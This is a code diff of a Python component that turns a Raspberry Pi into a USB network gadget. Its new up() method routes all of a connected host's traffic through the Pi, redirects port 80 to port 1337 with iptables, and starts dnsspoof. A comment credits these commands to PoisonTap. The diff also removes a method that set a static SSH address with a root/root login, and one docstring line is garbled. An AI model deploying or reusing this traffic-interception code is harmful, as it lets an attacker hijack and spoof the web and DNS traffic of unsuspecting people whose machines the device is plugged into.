@@ -12,20 +12,19 @@ class FwComponentNetwork(FwComponentGadget):
             debug:          for enabling debug text
 
         functions:
-            enable:         allows for enabling of driver
-            disable:        allows for disabling of driver
-            network_on:     allows for the ethernet adapter to be turned on
-            network_off:    allows for the ethernet adapter to be turned off
-            network_remove: allows for disable() to be called to disable and remove the driver
-            network_kill:   allows for the Ethernet Adapter to be disabled and removed if
-                            a ping fails
+            disable:        allows for the disabling of driver
+            up:             allows for the driver to be turned on and DHCP to be enabled
+            down:           allows for the driver to be turned off
+            kill:           allows for the driver to be disabled and removed if
+                            a ping fails or usb0 isn't recognised
+            test_internet:  allows for internet connectivity to be tested
+            test_local      checks whether usb0 is recognised by the pi
 
         Returns:
             framework component object
 
         Raises:
-            Critical error if connection is not established
-            Error thrown if ping is already in progress
+            import subprocess
     """
 
     # Constructor
@@ -33,18 +32,14 @@ class FwComponentNetwork(FwComponentGadget):
         super().__init__(driver_name="g_ether", enabled=enabled, vendor_id="0x04b3", product_id="0x4010", debug=debug)
         self.debug = debug
         self.state = state
-        self.ether_up = "ifup usb0"
-        self.ether_down = "ifdown usb0"
         self.ping_address = "8.8.8.8"
-        self.ping_response = ""
-        self.ssh_IP = "10.10.10.10"
 
     # Destructor
     def __del__(self):
         self.disable()  # Disable eth driver
 
     # Check for internet connectivity
-    def test(self):
+    def test_internet(self):
         flag_success = False  # Flag set when connection successful
         for i in range(1, 3):  # Only attempt ping 3 times
             if subprocess.call("ping -c 1 -w 3 " + self.ping_address, shell=True) == 0:  # Ping to test connection
@@ -56,28 +51,43 @@ class FwComponentNetwork(FwComponentGadget):
                 super().debug("Ping unsuccessful!")
                 # Try again
         if not flag_success:  # If 3 ping attempts fail
-            super().debug("Connection failed!")
-            return False
+            return self.kill("Connection failed!")
         return True
 
-    # Give pi static IP so SSH is possible
-    def ssh(self):
-        subprocess.call("echo -e 'interface usb0 \nstatic ip_address=" + self.ssh_IP + "' >> /etc/dhcpcd.conf")
-        super().debug("SSH enabled: username = root    password = root ")
-        return
+    # Find instance of "USB" in ifconfig to show that usb0 is connected
+    def test_local(self):
+        output = str(subprocess.run(["ifconfig"], stdout=subprocess.PIPE).stdout.decode())
+        if (output.count("usb0")) > 0:
+            super().debug("usb0 detected")
+            return True
+        else:
+            return self.kill("usb0 not detected")
 
-    # Turning on USB Ethernet adapter
+    # Turning on USB Ethernet adapter and enabling DHCP server
     def up(self):
-        subprocess.call(["./shell_scripts/usb_net_up.sh"])  # Run shell script to enable DHCP server and spoof ports
-        self.state = "eth up"
+        self.enable()
+        #  subprocess.call(["./shell_scripts/usb_net_up.sh"])  # Run shell script to enable DHCP server and spoof ports
+        super().debug(subprocess.call("ifup usb0", shell=True))  # Up usb0 interface
+        super().debug(subprocess.call("ifconfig usb0 up", shell=True))  # Up networking on usb0
+        super().debug(subprocess.call("/bin/route add -net 0.0.0.0/0 usb0", shell=True))  # Add route for all IPv4 addresses
+        super().debug(subprocess.call("/etc/init.d/isc-dhcp-server", shell=True))  # Start DHCP server
+
+        # Does things (stolen from poisontap)
+        super().debug(subprocess.call("/sbin/sysctl -w net.ipv4.ip_forward=1", shell=True))  # No idea what this does
+        super().debug(subprocess.call("/sbin/iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 1337", shell=True))  # Bind port 80 to port 1337
+        super().debug(subprocess.call("/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53", shell=True))  # Start dnsspoof on port 53
+        self.state = "usb0 up"
         if self.debug:  # Debug text
             super().debug(self.state)
-        return self.test()  # Test connection
+        return self.test_internet()  # Test connection
 
     # Turning off USB Ethernet adapter
     def down(self):
-        subprocess.call("%s" % self.ether_down, shell=True)  # Down adapter
-        self.state = "eth down"
+        #  subprocess.call(["./shell_scripts/usb_net_down.sh"])  # Down adapter
+        super().debug(subprocess.call("/etc/init.d/isc-dhcp-server stop", shell=True))
+        super().debug(subprocess.call("ifconfig usb0 down", shell=True))
+        super().debug(subprocess.call("ifdown usb0", shell=True))
+        self.state = "usb0 down"
         if self.debug:  # Debug text
             super().debug(self.state)
         return
@@ -103,4 +113,4 @@ class FwComponentNetwork(FwComponentGadget):
 # For testing
 if __name__ == "__main__":
     test = FwComponentNetwork()
-    test.up()
+    test.test_local()
